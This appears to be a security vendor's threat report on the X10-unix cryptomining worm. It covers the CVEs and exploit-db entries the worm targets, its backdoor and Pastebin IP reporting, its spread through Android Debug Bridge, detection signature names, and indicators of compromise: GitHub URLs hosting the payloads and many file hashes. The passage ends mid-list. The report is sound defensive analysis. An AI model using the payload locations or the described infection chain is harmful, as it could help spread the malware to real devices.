https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17562 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11511 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10758 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11447 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19509 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8816 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10987 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17463 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17496 https://www.exploit-db.com/exploits/37474 https://www.exploit-db.com/exploits/40500 https://www.exploit-db.com/exploits/45135 https://www.exploit-db.com/exploits/45161 https://www.exploit-db.com/exploits/46542 https://www.exploit-db.com/exploits/48225 https://www.exploit-db.com/exploits/48358 https://www.exploit-db.com/exploits/48676 https://www.exploit-db.com/exploits/48734 https://www.exploit-db.com/exploits/48737 https://www.exploit-db.com/exploits/48743 https://www.exploit-db.com/exploits/48751 https://www.exploit-db.com/exploits/48758 https://www.exploit-db.com/exploits/48771 https://www.exploit-db.com/exploits/48775 https://www.exploit-db.com/exploits/48805 https://www.exploit-db.com/exploits/48827 Many of these exploits are new, with public disclosures and proofs of concepts dated as recently as September. While the X10-unix attacks vary in target operating system and architecture, each tries to do three things: Install Monero cryptomining software. Install the appropriate version of the X10-unix worm. Open a backdoor listening on ports 30004 and 30006 and upload the victim’s IP address to a private Pastebin paste. Victim IP address being uploaded to Pastebin The backdoor is implemented by a UPX-packed binary “ss”, also written in Go, with variations compiled for Windows and multiple Linux architectures. This program first determines the hijacked computer’s external IP address from myexternalip.com, uploads that address as the name of a private Pastebin paste, then starts TCP listeners on ports 30004 and 30006. In addition to the known vulnerabilities above, X10-unix attempts to connect to Android Debug Bridge connections on port 5555. ADB infection code On successful connection, X10-unix runs a script that uploads a native binary (“blu”) and an Android APK (“weixin.apk”), both base64-encoded. Blu probes the device’s bluetooth hardware and installs the APK. The APK uploads the device’s IP address to Pastebin as above and then downloads and installs an ARM CPU port of X10-unix. A similar attempt is made to install payloads on existing reverse-shell backdoors listening on port 1337. While it’s difficult to ascertain the breadth or effectiveness of this malware campaign, in part because Monero — unlike Bitcoin — does not have publicly traceable transactions, JTL can confirm over a hundred distinct hosts have been observed propagating the infection. Detection by Juniper ATP Cloud In addition to detection by Juniper Advanced Threat Prevention products, payloads from this attack are detected by the following IDP signatures: HTTP:MISC:JBOSS-SEAM-EL-RCE, HTTP:CTS:REALTEK-SDK-COMMAND-IN, HTTP:HUAWEI-CVE-2017-17215-RCE, HTTP:CGI:WEB-SERVER-CGI-RCE, HTTP:CTS:RCONFIG-CMD-INJ, and HTTP:DIR:F5-BIGIP-DIR-TRAVERSAL. IOCs URLs starting with:\r\nraw.githubusercontent.com/cnmnmsl-001/-/master/\r\nraw.githubusercontent.com/sptv001/_/master/\r\n\r\nFrom https://github.com/sptv001/_:\r\n2f7303f98c5803278d4194c645494cc20e2c175330285f2eedcfc0934b4d51fe  config.json\r\ne67f78c479857ed8c562e576dcc9a8471c5f1ab4c00bb557b1b9c2d9284b8af9  ls\r\n20791ba9175c07d82c12ddedd2ce4d652ca428dfa63ef94f2710ebc83cdd386b  pass\r\n240f615a74bb3bdd734a2ace0b0127c021cf97d31d57756881e26b0e3dd42aa0  python\r\n571789c76c6b98396017249f362867ea2a6724808d61f4c2ffed6a32b4ebc01c  root_x86_64\r\n\r\nFrom https://github.com/cnmnmsl-001/-:\r\n5ae15feeea45c2b83abf2b8d9b4a20c21a0b188483b81a3f0a63c24774768249  X10-unix.exe\r\n8aea27d8177f803c1581a3522de17a421060618361a37bdfa9ac361046b5aa5b  X10-unix.exe\r\ncf3a9fe67387e494b02c8fa375934f92d136b6230fa67a85aa056150f6651e03  X10-unix.exe\r\n667bb7b4d4d5b7ba8c4be5387845f2be6e58e1bfd43e163a1652fd22eded5dfc  X10-unix.exe\r\n0c3d763bb94651f0f1b8ad700e1314e2e0406382802358a0eb7e4f4ead0ec7f5  X10-unix.exe\r\ne199ae0774910d6aef16623924d8c4520edd1e957c97cdd7871eb25cffbed0e9  X10-unix.exe\r\ne3092dd16d91a79e09b9cd9ce0f328a84c4c659d994acdfc02d43f5812832ffb  X10-unix.exe\r\nf8d537ea0e579e45e707371f4baa7cb255d2fed3f933b4841a2e7e3e4d3a30a1  X10-unix.exe\r\neb7c3b74f74d7156bf8092af699c9a7dcc1e425cdd6e66250d51daabf5e40860  X10-unix.exe\r\n5a1775d6034d580038a99511c1a7a85e9d5fc9c742de42c15787c2e6d1022960  X10-unix.exe\r\n55cab6688208cb5be6fc01c60880ac759ef7f749a3392aaca765f8e8016a01b0  X10-unix.exe\r\n8fcb33ba6d44bc68686ff67a9b21f69905eb85ab3ce7d94b30095224ee3dfbf8  X10-unix.exe\r\n2b520f45e77f9f7c22683ffab5c46a8331f7b13c5af30c957eb16e75dd0ce471  X10-unix.exe\r\n0797f6455de5f0a9221e47255f405b8123ccd01a51c1d59c1f22ecd0f53b9768  X10-unix.exe\r\n531abf8b57df1adad18aaa5c9dc8c94533f9d8b7760ad63ac5bf0a7138dcc1b4  X10-unix.exe\r\n13c37624799ffbd26be1e9e273b81ddd84dc52abbecbe9d52135064ff53ce23f  X10-unix.exe\r\nf02b78b0f89968573360d0d62bebdc53986feee9602a1f9d681e9caa9b548eb4  X10-unix.exe\r\n6dd60a32b8f49a4f06cec98e8d64d677288d982237d6b14dfcf647330d9882c8  X10-unix.exe\r\n8e4ba630d78f48de1330ca32bd987cc6d2474b5d9ecca550ea134445e0dd599d  X10-unix.exe\r\na2bbc59a9fa02bb7c6cf8862333085cfefddee4fc807e959074b74df20af4e0d  X10-unix.exe\r\ncb531f5567f2ebcd131dffc3ca3c53fab7cfacec827a529ed1adacb52c15b0cb  X10-unix.exe\r\n7042531d0a3f2cc8fcd1d9f9c47a617e3e0c497e27f752027be85b7a1e80ec8f  X10-unix.exe\r\n899492cb7a51e337d65c7412097e02d91f53ea4353b7d26aa12074f5714ed559  X10-unix.exe\r\nca52030fd16eb57b505ecb53d0dda6e54656755b2e4561ca5867d7340128652f  X10-unix.exe\r\n45b2e3258f5c57dfb078c7ddd130123864ed34cad2183da23d2bd411497e9443  X10-unix.exeb64\r\nb10df5e72952bbb9ba3fd733585ebf177e3a2e63270e67c846c1cbd55f7eaa66  X10-unix.exeb64\r\ne423a7d1f7581e050f25b6ebecdd1d5cf3148914236215d7022b030ba44c3b01  X10-unix.exeb64\r\nc72a731a5c2ddf78a551d08b334d96445c97cc8c2634446e1fdad3824ca0fe64  X10-unix.exeb64\r\n866676f223504cdfc12b41581bf56fe8989bad1f5dab9d08a4e4bf018921b432  X10-unix.exeb64\r\n8aa4ff26d60464ccd95937e63b7e6423a95625a0b76543df5cd560ac1b27fae0  X10-unix.exeb64\r\n234558a0c10077ba5508eeedc8da140416bc4d98d7e3aad577c6fa0fa2a7e44a  X10-unix\r\n28d4366481416faaa0dac2804fde60e6520650c734c789ca03840cd951a1fc62  X10-unix\r\na042561a7eaac77d82f50d6cd9655ddf257def26f51aff9f75a780de22996847  X10-unix\r\n68b690d62b9f4e1b4b7c1918b808c6c9e594e34602e6f9f8380ba161ce46716f  X10-unix\r\n67ee6758c4a672bd0733a7ac87d6c960190d2460ff21f2266da30abb77bc3edb  X10-unix\r\nd433b864222dd58615c8f87cd8dc7421a5a38c2b7dcad4c06811e4e22bb88bfc  X10-unix\r\n1a4f1356dad506bfffeafc314a717544049a8a2edd0fb6d46213d2331900dc6e  X10-unix\r\nbc732abfb7ed6a8789f3827611562c477f6d2b665bcb57777e4dc2b65271da63  X10-unix\r\n2084c586006f9a1f0a696707856f4ed9169e29766cd66d11d6e2c9d4f5aeece8  X10-unix\r\nb59edd38516d66176c221f8a6da86e398bed7cd037f7337a6317f94c5b514ffe  X10-unix\r\ncd58bf91cbe6e865594fb5ccc66dbfc5e6a04fdf5ed5253eeb50d39d0444743f  X10-unix\r\n5aff0cd4d2d91ecccbcd2eadb4236c33982845d942721c7d5e337b61739530c1  X10-unix\r\n8d0ebffcd312d845950503bc3e44f62ff3863de864101872e07a7b748be5f52b  X10-unix\r\nbded8591ef66f6d2d225646fc4eb6a1bd3871fad14026890fba20cfeece814fe  X10-unix\r\nb7c32fc1190e932c096c953bf656a85e1e258ad38a6caec85ff3e38c18d76827  X10-unix\r\n4d4d86e8407397ef9fe834d9df1f6b374735e11312f980dc0b3d09bab110f1b5  X10-unix\r\n8364a6ec1ab9fd8ca7dfcd44ea1ef341f610bd979acd827abd7f78f6f96c76c3  X10-unix\r\nafe9c9bda5ea920a5f960f13578ac6f02a1310e1dc0c47e23c866309727793d4  X10-unix\r\n73a070f8cdfccc173bc44c3f831197dae4193815d408c938b29f2f718a681b57  X10-unix\r\ne0b9ce6949da90b26cf9cc1f28ab1aa928a11668600f3c8de3604dac36b9e59f  X10-unix\r\n851408d4c2635f20455395193de2d6114e872986c466f16ad9af0c00446e19ce  X10-unix\r\n6fe2b86ebd35aa63de89d2db5726b293c06fb49ee4de8263db9a4d3e1f75e5d7  X10-unix\r\n11089aeeb0c517e61fabaa681c81a5b88f8c950897a71631f2c8e9c975c83314  X10-unix\r\n091cfffb203d580d77a83b5415b46cc16cf7c898a243f8d4e02469222d3f928a  X10-unix\r\nb2feb5887d3f13c2c00b16dd4dc40fb6d9d9cad1f2ac7f110c35919ca5b3f1f6  X10-unix\r\n25d6362d8be959af1a5eef950e9794b757e25e301ee3716286933fe16a24f664  X10-unix\r\n2cdc60d7270acc20783cb8ed32e94b72460d46cbbd8dce655019f32dc27c489f  X10-unix\r\nfc845b55d74ac2cb46c338e67974ed76b3ed7a3dd4321849c397eb114dad16e7  X10-unix\r\n10fcbf1f146963f055953c2c8f56e0f190b3a245eb06576e1a545851b1840d51  X10-unix\r\n28030624ad9872c54296b61671307bd4ac42cec419298c1c6e957cd603af4c24  X10-unix\r\n27c7216ef2b7dd2e3ecfb04fc585ef09deecd669b64a5fef969bf7dfa7766e64  X10-unix\r\n6d3ab23139e87bf40ccdc67c88bb9b9f6b580d83c6b5a739c310f588fd3b8296  X10-unix\r\nbf3685c5d2cc6b34f12a6c692b2d782a9dc76c12438913e3efc78a2942a375c3  X10-unix\r\n50d50749eb66b81f0f3ed72ea56a872cfe83f3f3f58efebab879a95746ef5123  X10-unix\r\n00fc9e383aa25daa2f8d71e0e9d5e60a43a41628fce350b6b87ad06eb7142aa0  X10-unix\r\nb238a6a61c0aba7c22152b007815815987ed0e87e0e27a41d697c9b27e4acfde  X10-unix\r\n74af23de9e5f32e1d7f25916e0d7432f6e5fa7e15cc4775e33b0c36ba248c820  X10-unix\r\n1956ddf9e96cc3f2ee4c761ec1cd79fd19c1e15a50e52ab1f2df7c44b5fccf37  X10-unix\r\nbdd57936b346111afe8710f9d8315e6747c3c118f5c2d352f13bf184ed211982  X10-unix\r\ndcf24f891c7aa0f6c18914bb71c855fe31a4f8427d5959387a796efbaf25ff50  X10-unix\r\n2e404707756c519f1f38185dfec94c6226ad52ede747c0f5cf90686dc77eaac1  X10-unix\r\n9b16007b668f0e6f904c57931dacfe62dbedfbe44237e36e8a6a17f16e694813  X10-unix\r\ndd9bab763cde3eb8ae740adcea4a5ca9dbd9fd8c01927f86f5d4987a77000abf  X10-unix\r\nd2c105308bd305688cabef8776174edcfaaefe7681227002b4d6f3bedddcff4b  X10-unix\r\n4e6c84bd73f126e2833b44b6329444a4db9b8012f9a41e8f7b927c1b5ba2a2b1  X10-unix\r\nfbf1d8b7fa00ceba9739b0e61462e7c57df8b92eae119dac254624669c0f3637  X10-unix\r\n081dbb86308710118c750e53e22c1c72353ddef7590fe0363ac1f747c11c57cb  X10-unix\r\n2b78f238eda8aeb09e8730c3b9d6ef6467cf0af2479b8afd18c59ee64f5b91d4  X10-unix\r\ne092ece35bc7047b7870959f0d36b0b2b6acdf104dd03993664140814fabc318  X10-unix\r\nd1bdedab5ea82227ab75a0ac8d0963f88de7325e04c0214ea09a1f2a1aa7517c  X10-unix\r\n7513a2f7de046843d2702df6c5cc047c4956c795430c7a8acbfad9123159d59d  X10-unix\r\n9a412594875a7e637b70d5c382355413e6a6f3cbb94cdfc8a13efd8611c34a92  X10-unix\r\n004e124c1fc7431427663c150f4864339ac1b06518f0331fae590fc518bca7e8  X10-unix\r\na4e2891bc9b9b380f227dfee982ad7bc452058b8dcdbbb44647c6f9db12a82d9  X10-unix\r\nd112d54e3ea7361ce6b40cde1355e46aecfbe81079f18b87e0783fb5c6fa59c6  X10-unix\r\n0bd537dc834d14d22414a6f5ea3e48d4ed431ae7a7b23c7c3cdb3c2589cfaa7c  X10-unix\r\nec7f2c3ba7d986a728c0ff1051988050321b15c033d8a9d45197c735fc9057c6  X10-unix\r\nd8133fcd0f90d493229dde473cb80ee2160b54b559be7ef89741aa951d36a6bf  X10-unix\r\n07da126c8c98eb021316e2a8fc41127eac15ea2a2aba9ffec1f84fd45609d127  X10-unix\r\n992780ddbd33b27d1a2dd78fe5a8d3606d9e620804cf9b9739b6c306d03ca146  X10-unix\r\n69c54bd72c94f2d69fba9acfaacd01fd3b9aab25b60ec649c3096f85718786bf  X10-unix\r\n54e55f8016dcfbd1edb1523af5ed9ddba6ce30601b68f6e60428049777cb220c  X10-unix\r\n40454c5615e526b0fafbd07452a0b8f3a23921991b83ad07145dd026f265bfae  X10-unix\r\n67412326b8083fa9d4182876bcf439424b155e500aabf44a86719affb3d382f4  X10-unix\r\n30b7c360b3a41510fd3f08b01c6dbf83f069d894451e8d786881fd74e5439338  X10-unix\r\n8430672fe24ec524073b41bfedb3e36505129ab82a1cd091ac7667f7d15a4272  X10-unix\r\n5fda7d7bb45f4c5afe53e8a84aea95a10cbc56943b226e41186e2c0606cf234b  X10-unix\r\n8b2663e4af97e3f6403c0e71fc234f0e217c1c1e4ede8fc05edc3711873c4fdb  X10-unix\r\ncd93ae333d30a757190e8fe9473717cfdaaa5eac8593a89652fa7d8ee684862e  X10-unix\r\ne9010e08624d5cceaf348433ab3d918d6c9ef8702e7bd1c6e408be6e290adb23  X10-unix\r\nb6ab98b696699b4e37f58e4187f91081b3b8e2c86c337486db060b037d610346  X10-unix\r\nd007bf24b4e05f558c282e52b7ef26d1d2910f434df9644f4ee638aa070d2dfa  X10-unix\r\n40b0d92412defa2a34e15915477c83e3108aa9d8610ddf425a5a4c7d3413e4f1  X10-unix\r\n74646b5fc17114b43a88fdac15747ec9f771fd74f934715dbdcf6c36c46edc54  X10-unix\r\n203b1436feff439e52b314147ba329cb70fffdd501b73854829617310465639b  X10-unix\r\nd552e9a091703694bda79109366bda0fc4dc2088b80631f0d0b8c557d59d884a  X10-unix\r\n4e5137804773228b7715b5c01401a9f1545ad0130f8e1dcb7eb8751d076e0148  X10-unix\r\ndc43d04dd554510decbeb8df37c0e16f5f17f8872da03c208f0c58f21a5e00cc  X10-unix\r\nd441ef15325471dd7394be6bbc63be13a0774f18cfc8572cc981239dca89222d  X10-unix\r\n300428c009f9b846c4f2d192f3972dfa50b763bbc3df4d9d1512545ff92c739e  X10-unix\r\n33abfabf4ca32af2ff32cc291b1699ab808855d1e9a63c3045b21eafca95865a  X10-unix\r\n5b85d1b1ce8323137b13933f0d3a34d133eaccc07054a36615a24d32b4f8d38d  X10-unix\r\n5d08598dd1173167a9399ce36fe8dcd4c55fa7babaed2151d2f72614eb7902c8  X10-unix\r\n1723abd7b3de0095bb0f67925a1d894eb3fbf25f99abaec4855cbbb44ebfe51e  X10-unix\r\nb8b82508f0da3d19d0088884b11a3911c298c9735079e9ea3c4190fefb18f939  X10-unix\r\n4a67aaa29e3bfea80c0466a61bbb90616c019315789aba523bb6f581b6b1bfe9  X10-unix\r\ne15f8f544e68e79488beaf8e9bbf0501c16f06c9c52c2b6fa2ecb16bf4952b72  X10-unix\r\n3da759474bb1330e91cac8e70ba41aad91f19f91988e13fb88718b036ac3c3ff  X10-unix\r\n6b8b2604c9cf98d74db283c1136bad29f2dafac041f83db7c98b4ff1006a3105  X10-unix\r\n269dcf35baf3eb32ecf566bbe37d84e353267820c7d4e82e586f5eda5f37f616  X10-unix\r\ndaccaaf710df4e5a11cf568c41eebd09d76b61568ab2f7c26c938e1412ca5625  X10-unix\r\n0ce9773f2cb696ef193c0135d2f8a33dc619881e1aae25795fba285a885ffdd4  X10-unix\r\n6686c15c69d862a7f2c4d9cc4d64f855d21e459db6d7f68e42690c56c47e1765  X10-unix\r\n00f55a233c70d6eacffd876e10b52862b3e051d213b1f39858269d463d51195c  X10-unix\r\n1c90f090f22eb2c17196074b8f061a589bfda8d7ad6e1221f872d35ad8ebf312  X10-unix\r\na189f5e731b17ab1bea9874c7414c570f5bc07c916a1e8b27a022359777a6fc4  X10-unix_arm\r\n01f8b63db3eb659a9b82b3dfa1a136a5931a2fb6e73019a4350b0ad488c437bb  X10-unix_arm\r\n6d361d46e5d8a05f28d3de8fc93d69db14176fb6fb1086c3a14abbfb81b0fc60  X10-unix_arm\r\n0783ce76ecc775ee9415541bc20e97fa5039e883a1db74b6f66a09ea4116b9c0  X10-unix_arm\r\n5e5e5b1e9dadcb846f99f9830fe72ac89dababed9fb5893588762adae2469740  X10-unix_arm\r\n52c0b16c608aa1e0b23498451adb40e7f7bfafadcaf923b16f6820cb222ee1fd  X10-unix_arm\r\na31f42b0df12c656d72269009e7aba45c7231c998f94b3370b09b8c971e441cf  X10-unix_arm\r\n65ea3c35c0e41962002b4bdb70ced04234ce7a5f5de7a9a69e2164ff443d854d  X10-unix_arm\r\n7916019f77df2661229256281172801807889d5fd59d08217b380b9e421cf8bb  X10-unix_arm\r\n2b8f0de62ad26f23704330ca795082151499810d0e09ff060d99715bf3ca82c4  X10-unix_arm\r\n1f66f669d91bab880af5ddad04359954c55d39fd797eb014b2dbb54fa4cac539  X10-unix_arm\r\n1c33346cf787e18cdd87f7e6728e4911fdf3e52149ea758b547e09266f0e5e3c  X10-unix_arm\r\n7d8092e4e13fef5cae20c35b00ee323cd80fd2d208c17e60cc5399cef118bee3  X10-unix_arm\r\nadf43f8857f8b2811508e8a33a13de38db1ac4cd1b9279e908e938c40b8a5379  X10-unix_arm\r\n4794b1dd06c131172c4192792ed9727c1edfeb6d1fce17ea6d0b310f23a010f6  X10-unix_arm\r\n21ed6124eddc5c5a1a5046fc5bec493daa24ec3461f9c0600310d8285753ab41  X10-unix_arm\r\n4ba587a096acb1ca91faf9943357b319f2d3368730c5962bd7f4338d5a0111cd  X10-unix_arm\r\n7643c17fde94bdfa23b2dc8493f50e48b7a146bdb486e1dc00a84109b9563603  X10-unix_arm\r\ndc8be9a7aa4c905fe27cb07429c20937e8adfa5d00e04249a5111a5e1e59d106  X10-unix_arm\r\n86b7aa7ea4cbb2cac867b02748ddd6e851d5b8c66ad0e6d2c669577611aa3d38  X10-unix_arm\r\ndee9672e77dafb22dde233087c6bd7c5896c31a006c3b608985937a22ccc1559  X10-unix_arm\r\na8ac2ff06de499b94a224cbb120f4c0852b97c3fd40b00ae91cc23a98f73a57f  X10-unix_arm\r\n3137252f6f88c703450a9bdee9d30301bb03b053db35d44a59324755ed32915e  X10-unix_arm\r\n71deb7a19cc540c220d21e88dd22e4038a4b00be59c743668fac586b2ee48988  X10-unix_arm\r\n1a67489914f0bf834f77b97e9b45c59614b2a36d16b7251fcc945a7fa733b88c  X10-unix_arm\r\n1e633d58a5ac496be65efbbb6958ff38ee802cf7693c37ad08b8d73d5b44da5b  X10-unix_arm\r\nbbd1500e39998acbf0b12eefd46f3e861762a5393982ff933732569b89dfc929  X10-unix_arm\r\n75999d719eae65660e7ebc90850e467e85e50339099ea661a6f4cb76ffaeee68  X10-unix_arm\r\nd09a225e5a39cddfc416031c325ffcb11a92d2b8196f99524efb4485968dcb2a  X10-unix_arm\r\n6544ae7ee86860e6e42cca1757241d9571e266a13c792753384c311423d17de7  X10-unix_arm\r\n1973c5abf0e2e13c129a307c46626015989c75c72b514cdbb0c8c9ef3b4b8db5  X10-unix_arm\r\na2e9f74e0b088adc596b8b789f0d06861eabed372d2893b43c84450151fded25  X10-unix_arm\r\n6ae16476c766aceab3bae71e9d743f567b4e69c1f750663c86ab7630eba9fffd  X10-unix_arm\r\n48124ba43a19ce59136b0e574834967820a757a169d9443aa501ec3efb2eb0d4  X10-unix_arm\r\n26a2262df61fdc73756b9aafddb8b192590e89607fb242f67ed6c60c97918e78  X10-unix_arm\r\n48788891c198d06d523c0e623b91f586f456fcc97f15a0eea601de6348b93b6d  X10-unix_arm\r\n09ba334e2ad70f75d64fb4d8fa6d32c2ce890d9bdc844c69bf8db79cb9edb7c3  X10-unix_arm\r\n4d16c41bd7ee36c1ca7cfb2329d6144b3979d0454b441645d6f726f3994ef325  X10-unix_arm\r\n8ecc24bb91ffdd8a5c3dca13a5db82832fc763ef05d52cc28f2339efd396a1ef  X10-unix_arm\r\nf7b0d9f5ae1e443f557763c66b600d15409ae15daa92706aa9416c8f027fdfe2  X10-unix_arm\r\n3b4fb8d0242d0157d875497725a56cb4b250b66c93685d800daffa963c06c33d  X10-unix_arm\r\nd1198183f55526efd5dbe9184b9c41388bda304791361d23d5ce739594562533  X10-unix_arm\r\n641d0e9b002e3100bbe9ff8642a0b7e2d45ea812df3756b5ed7e58cae56a2ead  X10-unix_arm\r\nbb7ae300c18c8382c017caa369bd2de1918a760b38254e29edf5988d709f98aa  X10-unix_arm\r\n26e90c4e246ae51ced1c5cb7d7ba970407bbad5162d705fc36eca1457d439f51  X10-unix_arm\r\n2ac9114c9306d25a01ae7d2ad70abce3fe394c1cd96308c93f163f6611c80756  X10-unix_arm\r\n118d80ee95679e321d84d22d37a1d28bbb1a72883926d7e97d0cabd341286d5d  X10-unix_arm\r\n327e7dd5e4d407de9e10b1062ac50902a8639f55fb30dcedf74742790a76895e  X10-unix_arm\r\nd5b2c1a2c2608e5a7b0fb1dcd2e474eafcb9ddc42a4aa2c79c825348be8f50f3  X10-unix_arm\r\n8b9afc82f67ad6277e8ec01df85871dfda00008895b826d938644af6e063da82  X10-unix_arm\r\nb73c0a14dc5b0bafe1dac5884afc608578fe6bb658e5b965ec1de9774a0a3ae2  X10-unix_arm\r\n8e07e385876289d39ea162d87f0d1dbfb9700e681377002d42392ce525d7d719  X10-unix_arm\r\n1a5eec63131f10a2848a6b6a47f06839c1df5015322a4e1671f8557a31c68683  X10-unix_arm\r\nd6e311e6fdb4b3287cb82f205a4781dda6d949e9b5ce68bd4a63137574019d2d  X10-unix_arm\r\n7e05001b892042b1aee7f475122cb8b1df468db92f1a065ef47a29cf4ab9e9c3  X10-unix_arm\r\n1025920629dbda4675ded73ebabe480e7d26277f25cdea9d7590ea0818ed47ab  X10-unix_arm\r\n856689b018e80438b26c9562e74bf66fe993ef1c07f3d5bb66315687b66bf04a  X10-unix_arm\r\nf90848ded182ed22f5f600b21ac2c1ab5ede3773f975896a34865496edd5164b  X10-unix_arm\r\n07a5ae51a3dbf3beb9c890622ab76b64e9176141871eeaea9893e2e987d4b58a  X10-unix_arm\r\n860f59e0ccf546cc07df344c0d97d5852e41910db5d9c7ab881071bd578ab830  X10-unix_arm\r\ndba1172e8961dbee57777bf3c9de63bd3346c49c285b14a89340ddb2240284e0  X10-unix_arm\r\n437c821528a77bda1f6d31553cc6a90e4dbf280c8b2d497f6d0f50e107ba4f6a  X10-unix_arm\r\n02630d8c8b1844efd1d5033af81187a9674155ceaa5bf9bf39a0667a6231039a  X10-unix_armb64\r\n3fa06187c266351e548d1fd9e1b270ae943cc4417e947657bf1ebed0b0c80800  X10-unix_armb64\r\n90096e7775ccf7c1adb0ef5fff4e36c01e1f7eab5dce8017e5de4634df21e2fb  X10-unix_armb64\r\n640287f743a859640b62fac73ef191f958849bbf69a49ae95777b62853659c56  X10-unix_armb64\r\na7518336e94e8f6c3000168f7eb2f5204fed8750a58334447c214179bd4cea6d  X10-unix_armb64\r\ncb99f488f3143c7f41bba05f566d1eb9d8f09bef7dfbce35bf910e3670a87fc1  X10-unix_armb64\r\nc930defd00b99430148f689198dbe427396a25a011618da43c8c17557b4b89ee  X10-unix_mips\r\nd6a4a72165265ca6aec4cca0775ca403bbaf713689ebfda2f0aeba8341527513  X10-unix_mips\r\n593fd3a9946ae6e1eb457e812635d161c4060ca9994c1af6693073a72f37f272  X10-unix_mips\r\nd609bbee26838a421a29a5acf1f8c394d05bdaabc21226c027317c8e285752d2  X10-unix_mips\r\n7fac1005ecc3a76c153e0f3bd39eac348998b4c9f94150281791eb1c088cf111  X10-unix_mips\r\n5d0cdf6ce1ca67dcde179db2fbd527358983fed57a333b02b1be7aead8fffe8c  X10-unix_mips\r\n5809f37091be4c525522080fcdc033ff8179b77f5cf8974b2debaa8c909ac17d  X10-unix_mips\r\n54fc8cb6405e4d46815da8966a6c4b9d497f01b2c12ee46901f22e4a28ac606c  X10-unix_mips\r\ncad86df45b48eb86440bc9245f2a017c56b235ce6a51ac09439ee79d470c7e95  X10-unix_mips\r\nd618308c0e1ab826f1c5ab6de0f55b0a7ea65e0b1f6853b7990ae79de983db1a  X10-unix_mips\r\nbe434a0afc7d4ee0c38f1362d274463a1a6ead82983a3e602bab18a2189c354c  X10-unix_mips\r\nc4456da60563e9272f7a4b82fcf3632c17d756c0f00f641008d898e00732186f  X10-unix_mips\r\n4b9326290509a49c951ae676d57302a0d4423a67f13179ce5d655a30bfd3b553  X10-unix_mips\r\nfc82a4ed35b416bf85dcf2af8832e259f783695a12fd83aaf424a1812b51cb41  X10-unix_mips\r\nde5fce323f00bc5267ab59093c2a39d52919ecd1c2e40aa99335658f176d0004  X10-unix_mips\r\n4461f27d80dd90a6a93450c249fe1a334ab2a6d1c5334a96454d4301c9fe45f2  X10-unix_mips\r\nfee10027ffc502060b7a68c13126727e79752200917532693a4a1dc8b88f8eb0  X10-unix_mips\r\na63c421fedfa5300215150a2adcf771b22806c500e57dabef5c55e30b9da659f  X10-unix_mips\r\n83c031c53e1b638729381d528d3079c7fa10e8645b4751367468a32aa0410927  X10-unix_mips\r\n19ee274f39587586685cad38ac00ce14ace3d3d54187c4c7b49529619c80caff  X10-unix_mips\r\nfc05e00c5fbf154575179cf6bc544be709209a3438ec7e5620b11a41cf2a3b1a  X10-unix_mips\r\nfaa5c2ce36e61cff87f15493b447bad3d32fccd8592daf89744e804e613c0ce4  X10-unix_mips\r\n73a33bcb931100b1c7c69bb602f29af63ac7fece7ffc5010b9127c11e3cda9a9  X10-unix_mips\r\n6552ca5e01fa8d7ae6282992ea04cdd766c6cc91a7a013159b1e248a4b3923bc  X10-unix_mips\r\n4eaa41e46cbd8a210c55710a1408fe65e6fdb75519fd5aab803e1790ee5adc21  X10-unix_mips\r\nfbf9a193e6c22148343c7149b478896ab2080d496b30a2ee63d8f5476f4c768b  X10-unix_mips\r\nc4276a635aa8a64ac641cb1ca52cbe2b94e75dfedd280c9d5f3b87ec09e9d6d0  X10-unix_mips\r\n548067df7937ae99f495eeacebf95babb453b8210440977fc8da974c5edcb3b5  X10-unix_mips\r\n120c439492a7568f9d3c4dbb37fddc19ceb37d050b2332e03ceff179701f3112  X10-unix_mips\r\n8981db535d14c7ee074ce0e7ee8c0c5cf941823ad473edd720eb5fa5ad5dcf05  X10-unix_mips\r\n0be37eb7fbdbd707a96583039b306072624ccf3d555e2cb6092779148337e826  X10-unix_mips\r\n14326fa642a6f6242d2800d4c8e812fada88c60bc0297f173438427c083ffd0f  X10-unix_mips\r\n7b099ba12857d583cb680a2dfc2a208036834e5b159608909749c17fc9fe09b9  X10-unix_mips\r\n74d8ec31cbe3d789e8e11a8257a764976e14e20d0d0f0ac96ded78cd5f0daf19  X10-unix_mips\r\n7ce253900b8aeeefe712e49d4ebf053f7c7db384bd91e290ccc2cc8d0fd9eb50  X10-unix_mips\r\n7fcc785003806652586405412509ffdeac74903944f97b18e0c8b0101b10ddce  X10-unix_mips\r\n6abf58434a2a15825d39beaee1a314d4b21c669e1615d112d436b11c4e74ec6b  X10-unix_mips\r\n98d93716b46c9dfe66f71e62f1aad625fb585d4d7fea9c24f192924d097e61ba  X10-unix_mips\r\n4721a2f098418568280c667890e652421e59afcdf7b53cb7dc98fc9222f88f39  X10-unix_mips\r\n83e678f8d0c25705bb5b8ae847b0de8ebbebf35ce15722502cf79d9e1c6b3b39  X10-unix_mips\r\n292adca62a990611736a4911ca825f33a70ee1f83cd08f981e43c5f4c465b4db  X10-unix_mips\r\n4dc5257bafc88ce31abbdfceea5c1a6383495967faa47bd53eb672fd41fed564  X10-unix_mips\r\n21653baad763c7e35b0dd4a763c31bda44ff64f82bd451c6873b31222945dc42  X10-unix_mips\r\na8f1ec2798da01dcaec74c6f5df87e3451b30e7c65826248ff748b5a75208c9b  X10-unix_mips\r\n9fbb91f9de849d43940a9b2a7d160200eb17c14986ea6b569b4b5a73bc0bdf3e  X10-unix_mips\r\n0232c853fb571b7e2b0ffe2e0922605e0d1cd89412fec90a01d847861db72496  X10-unix_mips\r\n4105d5e7f6207b07f5ee09eee94b0293eb4f8b71e83ba914a4f6fbea556c3290  X10-unix_mips\r\n6f12ce8e08b7cf8ce9ecefba066cc7c990767b7ecaa311188519474f46a55de1  X10-unix_mips\r\nc6707c5a554385514bdc63fa3824a2f563314acc190d817c09fa6c3de669b51a  X10-unix_mips\r\n991ad42e3969046670dc79b26c5c5209e415ff62b4e3ec765816984bf81adab6  X10-unix_mips\r\nee8bb4975a44e7bf9432a0e7a08bc4362b17dbca769e6272839a4e5ba34e4cc8  